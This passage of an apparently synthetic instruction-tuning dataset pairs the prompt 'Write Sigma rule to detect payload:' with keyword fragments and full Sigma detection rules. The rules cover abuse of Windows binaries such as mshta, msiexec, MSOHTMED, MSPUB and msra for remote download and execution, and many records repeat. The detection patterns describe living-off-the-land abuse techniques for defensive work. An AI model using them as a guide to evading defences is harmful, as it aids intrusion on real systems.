       - '.lnk'\n            - '.log'\n            - '.mkv'\n            - '.mp3'\n            - '.mp4'\n            - '.pdf'\n            - '.png'\n            - '.ppt'\n            - '.rar'\n            - '.rtf'\n            - '.svg'\n            - '.tar'\n            - '.tmp'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n            - '.yaml'\n            - '.yml'\n            - '.zip'\n            - 'vbscript'\n            # - '.chm'  # could be prone to false positives\n            # - '.exe'\n    condition: all of selection_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta mshta .7z .avi .bmp .conf .csv .dll .doc .gif .gz .ini .jpe .jpg .json .lnk .log .mkv .mp3 .mp4 .pdf .png .ppt .rar .rtf .svg .tar .tmp .txt .xls .xml .yaml .yml .zip vbscript", "output": "title: MSHTA Execution with Suspicious File Extensions\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: |\n    Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,\n    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications\n    containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and\n    execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\n    - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2019-02-22\nmodified: 2025-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'mshta.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.7z'\n            - '.avi'\n            - '.bat'\n            - '.bmp'\n            - '.conf'\n            - '.csv'\n            - '.dll'\n            - '.doc'\n            - '.gif'\n            - '.gz'\n            - '.ini'\n            - '.jpe'\n            - '.jpg'\n            - '.json'\n            - '.lnk'\n            - '.log'\n            - '.mkv'\n            - '.mp3'\n            - '.mp4'\n            - '.pdf'\n            - '.png'\n            - '.ppt'\n            - '.rar'\n            - '.rtf'\n            - '.svg'\n            - '.tar'\n            - '.tmp'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n            - '.yaml'\n            - '.yml'\n            - '.zip'\n            - 'vbscript'\n            # - '.chm'  # could be prone to false positives\n            # - '.exe'\n    condition: all of selection_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe mshta.exe .7z .avi .bat .bmp .conf .csv .dll .doc .gif .gz .ini .jpe .jpg .json .lnk .log .mkv .mp3 .mp4 .pdf .png .ppt .rar .rtf .svg .tar .tmp .txt .xls .xml .yaml .yml .zip vbscript", "output": "title: MSHTA Execution with Suspicious File Extensions\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: |\n    Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,\n    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications\n    containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and\n    execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\n    - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2019-02-22\nmodified: 2025-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'mshta.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.7z'\n            - '.avi'\n            - '.bat'\n            - '.bmp'\n            - '.conf'\n            - '.csv'\n            - '.dll'\n            - '.doc'\n            - '.gif'\n            - '.gz'\n            - '.ini'\n            - '.jpe'\n            - '.jpg'\n            - '.json'\n            - '.lnk'\n            - '.log'\n            - '.mkv'\n            - '.mp3'\n            - '.mp4'\n            - '.pdf'\n            - '.png'\n            - '.ppt'\n            - '.rar'\n            - '.rtf'\n            - '.svg'\n            - '.tar'\n            - '.tmp'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n            - '.yaml'\n            - '.yml'\n            - '.zip'\n            - 'vbscript'\n            # - '.chm'  # could be prone to false positives\n            # - '.exe'\n    condition: all of selection_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe \\msiexec.exe -z .dll", "output": "title: DllUnregisterServer Function Call Via Msiexec.EXE\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nstatus: test\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-04-24\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    selection_flag:\n        CommandLine|contains|windash: ' -z '\n    selection_dll:\n        CommandLine|contains: '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe \\msiexec.exe -z .d\"ll\"", "output": "title: DllUnregisterServer Function Call Via Msiexec.EXE\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nstatus: test\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-04-24\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    selection_flag:\n        CommandLine|contains|windash: ' -z '\n    selection_dll:\n        CommandLine|contains: '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec \\msiexec -z .dll", "output": "title: DllUnregisterServer Function Call Via Msiexec.EXE\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nstatus: test\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-04-24\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    selection_flag:\n        CommandLine|contains|windash: ' -z '\n    selection_dll:\n        CommandLine|contains: '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe \\msiexec.exe -z .dll", "output": "title: DllUnregisterServer Function Call Via Msiexec.EXE\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nstatus: test\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-04-24\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    selection_flag:\n        CommandLine|contains|windash: ' -z '\n    selection_dll:\n        CommandLine|contains: '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe msiexec.exe -i -package -a -j -q http \\\\\\\\", "output": "title: Suspicious Msiexec Quiet Install From Remote Location\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nrelated:\n    - id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n      type: similar\nstatus: test\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-28\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    selection_remote:\n        CommandLine|contains:\n            - 'http'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe msiexec.exe -i -package \\\"-a\\\" -j -q http \\\\\\\\", "output": "title: Suspicious Msiexec Quiet Install From Remote Location\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nrelated:\n    - id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n      type: similar\nstatus: test\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-28\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    selection_remote:\n        CommandLine|contains:\n            - 'http'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec msiexec -i -package -a -j -q http \\\\\\\\", "output": "title: Suspicious Msiexec Quiet Install From Remote Location\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nrelated:\n    - id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n      type: similar\nstatus: test\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-28\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    selection_remote:\n        CommandLine|contains:\n            - 'http'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msiexec.exe msiexec.exe -i -package -a -j -q http \\\\\\\\", "output": "title: Suspicious Msiexec Quiet Install From Remote Location\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nrelated:\n    - id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n      type: similar\nstatus: test\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-28\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    selection_remote:\n        CommandLine|contains:\n            - 'http'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msiexec ://", "output": "title: MsiExec Web Install\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nrelated:\n    - id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\n      type: similar\nstatus: test\ndescription: Detects suspicious msiexec process starts with web addresses as parameter\nreferences:\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-02-09\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' msiexec'\n            - '://'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msiexec \":\"\"/\"\"/\"", "output": "title: MsiExec Web Install\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nrelated:\n    - id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\n      type: similar\nstatus: test\ndescription: Detects suspicious msiexec process starts with web addresses as parameter\nreferences:\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-02-09\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' msiexec'\n            - '://'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msiexec ://", "output": "title: MsiExec Web Install\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nrelated:\n    - id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\n      type: similar\nstatus: test\ndescription: Detects suspicious msiexec process starts with web addresses as parameter\nreferences:\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-02-09\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' msiexec'\n            - '://'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSOHTMED.exe MsoHtmEd.exe ftp:// http:// https://", "output": "title: Arbitrary File Download Via MSOHTMED.EXE\nid: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d\nstatus: test\ndescription: Detects usage of \"MSOHTMED\" to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSOHTMED.exe'\n        - OriginalFileName: 'MsoHtmEd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSOHTMED.exe MsoHtmEd.exe ftp:// htt\"p://\" https://", "output": "title: Arbitrary File Download Via MSOHTMED.EXE\nid: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d\nstatus: test\ndescription: Detects usage of \"MSOHTMED\" to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSOHTMED.exe'\n        - OriginalFileName: 'MsoHtmEd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSOHTMED MsoHtmEd ftp:// http:// https://", "output": "title: Arbitrary File Download Via MSOHTMED.EXE\nid: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d\nstatus: test\ndescription: Detects usage of \"MSOHTMED\" to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSOHTMED.exe'\n        - OriginalFileName: 'MsoHtmEd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSOHTMED.exe ftp:// https:// MsoHtmEd.exe http://", "output": "title: Arbitrary File Download Via MSOHTMED.EXE\nid: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d\nstatus: test\ndescription: Detects usage of \"MSOHTMED\" to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSOHTMED.exe'\n        - OriginalFileName: 'MsoHtmEd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSPUB.exe MSPUB.exe ftp:// http:// https://", "output": "title: Arbitrary File Download Via MSPUB.EXE\nid: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf\nstatus: test\ndescription: Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-02-08\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSPUB.exe'\n        - OriginalFileName: 'MSPUB.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSPUB.exe MSPUB.exe ftp:// http:// \\\"https://\\\"", "output": "title: Arbitrary File Download Via MSPUB.EXE\nid: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf\nstatus: test\ndescription: Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-02-08\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSPUB.exe'\n        - OriginalFileName: 'MSPUB.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSPUB MSPUB ftp:// http:// https://", "output": "title: Arbitrary File Download Via MSPUB.EXE\nid: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf\nstatus: test\ndescription: Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-02-08\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSPUB.exe'\n        - OriginalFileName: 'MSPUB.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\MSPUB.exe ftp:// http:// https:// MSPUB.exe", "output": "title: Arbitrary File Download Via MSPUB.EXE\nid: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf\nstatus: test\ndescription: Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-02-08\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MSPUB.exe'\n        - OriginalFileName: 'MSPUB.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msra.exe \\arp.exe \\cmd.exe \\net.exe \\netstat.exe \\nslookup.exe \\route.exe \\schtasks.exe \\whoami.exe", "output": "title: Potential Process Injection Via Msra.EXE\nid: 744a188b-0415-4792-896f-11ddb0588dbc\nstatus: test\ndescription: Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\nreferences:\n    - https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/\n    - https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf\nauthor: Alexander McDonald\ndate: 2022-06-24\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\msra.exe'\n        ParentCommandLine|endswith: 'msra.exe'\n        Image|endswith:\n            - '\\arp.exe'\n            - '\\cmd.exe'\n            - '\\net.exe'\n            - '\\netstat.exe'\n            - '\\nslookup.exe'\n            - '\\route.exe'\n            - '\\schtasks.exe'\n            - '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Msra.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msra.exe \\arp.exe \"\\cmd.exe\" \\net.exe \\netstat.exe \\nslookup.exe \\route.exe \\schtasks.exe \\whoami.exe", "output": "title: Potential Process Injection Via Msra.EXE\nid: 744a188b-0415-4792-896f-11ddb0588dbc\nstatus: test\ndescription: Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\nreferences:\n    - https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/\n    - https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf\nauthor: Alexander McDonald\ndate: 2022-06-24\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\msra.exe'\n        ParentCommandLine|endswith: 'msra.exe'\n        Image|endswith:\n            - '\\arp.exe'\n            - '\\cmd.exe'\n            - '\\net.exe'\n            - '\\netstat.exe'\n            - '\\nslookup.exe'\n            - '\\route.exe'\n            - '\\schtasks.exe'\n            - '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Msra.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msra \\arp \\cmd \\net \\netstat \\nslookup \\route \\schtasks \\whoami", "output": "title: Potential Process Injection Via Msra.EXE\nid: 744a188b-0415-4792-896f-11ddb0588dbc\nstatus: test\ndescription: Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\nreferences:\n    - https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/\n    - https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf\nauthor: Alexander McDonald\ndate: 2022-06-24\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\msra.exe'\n        ParentCommandLine|endswith: 'msra.exe'\n        Image|endswith:\n            - '\\arp.exe'\n            - '\\cmd.exe'\n            - '\\net.exe'\n            - '\\netstat.exe'\n            - '\\nslookup.exe'\n            - '\\route.exe'\n            - '\\schtasks.exe'\n            - '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Msra.exe\nlevel: high"}
